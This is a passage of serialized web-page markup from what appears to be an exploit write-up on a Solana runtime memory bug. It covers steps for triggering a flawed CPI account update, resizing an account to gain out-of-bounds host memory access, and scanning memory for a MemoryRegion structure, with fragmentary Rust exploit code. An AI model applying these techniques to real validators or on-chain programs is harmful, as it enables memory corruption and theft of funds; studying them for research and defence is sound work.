token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],\"$Ld42\",\"$Ld43\",\"$Ld44\",\"$Ld45\",\"$Ld46\",\"$Ld47\",\"$Ld48\",\"$Ld49\",\"$Ld4a\",\"$Ld4b\",\"$Ld4c\",\"$Ld4d\",\"$Ld4e\",\"$Ld4f\",\"$Ld50\",\"$Ld51\",\"$Ld52\",\"$Ld53\",\"$Ld54\",\"$Ld55\",\"$Ld56\",\"$Ld57\",\"$Ld58\",\"$Ld59\",\"$Ld5a\",\"$Ld5b\",\"$Ld5c\",\"$Ld5d\",\"$Ld5e\",\"$Ld5f\",\"$Ld60\",\"$Ld61\",\"$Ld62\",\"$Ld63\",\"$Ld64\",\"$Ld65\",\"$Ld66\",\"$Ld67\",\"$Ld68\",\"$Ld69\",\"$Ld6a\",\"$Ld6b\",\"$Ld6c\",\"$Ld6d\",\"$Ld6e\",\"$Ld6f\",\"$Ld70\",\"$Ld71\",\"$Ld72\",\"$Ld73\",\"$Ld74\",\"$Ld75\",\"$Ld76\",\"$Ld77\",\"$Ld78\",\"$Ld79\",\"$Ld7a\",\"$Ld7b\",\"$Ld7c\",\"$Ld7d\",\"$Ld7e\",\"$Ld7f\",\"$Ld80\",\"$Ld81\",\"$Ld82\",\"$Ld83\",\"$Ld84\",\"$Ld85\",\"$Ld86\",\"$Ld87\",\"$Ld88\",\"$Ld89\",\"$Ld8a\",\"$Ld8b\",\"$Ld8c\",\"$Ld8d\",\"$Ld8e\",\"$Ld8f\",\"$Ld90\",\"$Ld91\",\"$Ld92\",\"$Ld93\",\"$Ld94\",\"$Ld95\",\"$Ld96\",\"$Ld97\",\"$Ld98\",\"$Ld99\",\"$Ld9a\",\"$Ld9b\",\"$Ld9c\",\"$Ld9d\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"c9:[\"$\",\"h4\",\"h4-13\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 3: Vulnerability Trigger via CPI\"}]\nca:[\"$\",\"p\",\"p-119\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Now we trigger the flawed \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"update_caller_account()\"}],\" logic by initiating a CPI call doing nothing but with the corrupted \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\" account.\"]}]\n"])</script><script>self.__next_f.push([1,"cb:[\"$\",\"pre\",\"pre-17\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"invoke_signed\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new_with_bincode\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"program_id\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#7ec699\"},\"children\":[\"b\\\"\\\"\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}],\"$Ld9e\",\"$Ld9f\",\"$Lda0\",\"$Lda1\",\"$Lda2\",\"$Lda3\",\"$Lda4\",\"$Lda5\",\"$Lda6\",\"$Lda7\",\"$Lda8\",\"$Lda9\",\"$Ldaa\",\"$Ldab\",\"$Ldac\",\"$Ldad\",\"$Ldae\",\"$Ldaf\",\"$Ldb0\",\"$Ldb1\",\"$Ldb2\",\"$Ldb3\",\"$Ldb4\",\"$Ldb5\",\"$Ldb6\",\"$Ldb7\",\"$Ldb8\",\"$Ldb9\",\"$Ldba\",\"$Ldbb\",\"$Ldbc\",\"$Ldbd\",\"$Ldbe\",\"$Ldbf\",\"$Ldc0\",\"$Ldc1\",\"$Ldc2\",\"$Ldc3\",\"$Ldc4\",\"$Ldc5\",\"$Ldc6\",\"$Ldc7\",\"$Ldc8\",\"$Ldc9\",\"$Ldca\",\"$Ldcb\",\"$Ldcc\",\"$Ldcd\",\"$Ldce\",\"$Ldcf\",\"$Ldd0\",\"$Ldd1\",\"$Ldd2\",\"$Ldd3\",\"$Ldd4\",\"$Ldd5\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"cc:[\"$\",\"p\",\"p-120\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"During this CPI call, the runtime builds a \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount\"}],\" for \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\" using the malformed \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_data_addr\"}],\". Later when CPI returns, it starts the \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" update process, but instead of finding \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\"'s \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\", it locates \",[\"$\",\"strong\",\"strong-2\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\"'s \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" and updates \",[\"$\",\"strong\",\"strong-3\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\"'s \",[\"$\",\"code\",\"code-5\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\" to point to \",[\"$\",\"strong\",\"strong-4\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\"'s buffer.\"]}]\n"])</script><script>self.__next_f.push([1,"cd:[\"$\",\"h4\",\"h4-14\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 4: Size Mismatch to OOB\"}]\nce:[\"$\",\"p\",\"p-121\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Next, we expand \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" to create the size mismatch.\"]}]\n"])</script><script>self.__next_f.push([1,"cf:[\"$\",\"pre\",\"pre-18\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE back to a larger size for memory scanning\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xa00000\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"d0:[\"$\",\"p\",\"p-122\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"So when we access \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"LEVERAGE\"}],\" beyond \",[\"$\",\"strong\",\"strong-1\",{\"className\":\"font-semibold text-white\",\"children\":\"SWAP\"}],\"'s buffer size, we get out-of-bounds access to host memory.\"]}]\nd1:[\"$\",\"h4\",\"h4-15\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":[\"Step 5: Egg Hunting for \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}]]}]\nd2:[\"$\",\"p\",\"p-123\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"With the out-of-bounds read/write, we can now hunt for the \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"POINTER\"}],\" account's \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" structure in host memory.\"]}]\n"])</script><script>self.__next_f.push([1,"d3:[\"$\",\"pre\",\"pre-19\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" leverage_data \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" scan_ptr \"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" leverage_data\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}],[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],\"$Ldd6\",\"$Ldd7\",\"$Ldd8\",\"$Ldd9\",\"$Ldda\",\"$Lddb\",\"$Lddc\",\"$Lddd\",\"$Ldde\",\"\\n\",\"$Lddf\",\"$Lde0\",\"$Lde1\",\"$Lde2\",\"$Lde3\",\"$Lde4\",\"$Lde5\",\"$Lde6\",\"$Lde7\",\"$Lde8\",\"$Lde9\",\"$Ldea\",\"$Ldeb\",\"$Ldec\",\"$Lded\",\"$Ldee\",\"$Ldef\",\"$Ldf0\",\"    \\n\",\"$Ldf1\",\"$Ldf2\",\"$Ldf3\",\"$Ldf4\",\"$Ldf5\",\"$Ldf6\",\"$Ldf7\",\"$Ldf8\",\"$Ldf9\",\"$Ldfa\",\"$Ldfb\",\"$Ldfc\",\"$Ldfd\",\"$Ldfe\",\"$Ldff\",\"$Le00\",\"$Le01\",\"$Le02\",\"$Le03\",\"$Le04\",\"$Le05\",\"$Le06\",\"$Le07\",\"$Le08\",\"$Le09\",\"$Le0a\",\"$Le0b\",\"$Le0c\",\"$Le0d\",\"$Le0e\",\"$Le0f\",\"$Le10\",\"$Le11\",\"$Le12\",\"$Le13\",\"$Le14\",\"$Le15\",\"$Le16\",\"$Le17\",\"$Le18\",\"$Le19\",\"$Le1a\",\"$Le1b\",\"$Le1c\",\"$Le1d\",\"$Le1e\",\"$Le1f\",\"$Le20\",\"$Le21\",\"$Le22\",\"$Le23\",\"$Le24\",\"$Le25\",\"$Le26\",\"$Le27\",\"$Le28\",\"$Le29\",\"$Le2a\",\"$Le2b\",\"$Le2c\",\"$Le2d\",\"$Le2e\",\"$Le2f\",\"$Le30\",\"$Le31\",\"$Le32\",\"$Le33\",\"$Le34\",\"$Le35\",\"$Le36\",\"$Le37\",\"$Le38\",\"$Le39\",\"$Le3a\",\"$Le3b\",\"$Le3c\",\"$Le3d\",\"$Le3e\",\"$Le3f\",\"$Le40\",\"$Le41\",\"$Le42\",\"$Le43\",\"$Le44\",\"$Le45\",\"$Le46\",\"$Le47\",\"$Le48\",\"$Le49\",\"$Le4a\",\"$Le4b\",\"$Le4c\",\"$Le4d\",\"$Le4e\",\"$Le4f\",\"$Le50\",\"$Le51\",\"$Le52\",\"$Le53\",\"$Le54\",\"$Le55\",\"$Le56\",\"$Le57\",\"$Le58\",\"$Le59\",\"$Le5a\",\"$Le5b\",\"$Le5c\",\"$Le5d\",\"$Le5e\",\"$Le5f\",\"$Le60\",\"$Le61\",\"$Le62\",\"$Le63\",\"$Le64\",\"$Le65\",\"$Le66\",\"$Le67\",\"$Le68\",\"$Le69\",\"$Le6a\",\"$Le6b\",\"$Le6c\",\"$Le6d\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"d4:[\"$\",\"p\",\"p-124\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"We do a really simple signature matching here to locate the \",[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"POINTER\"}],\" \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 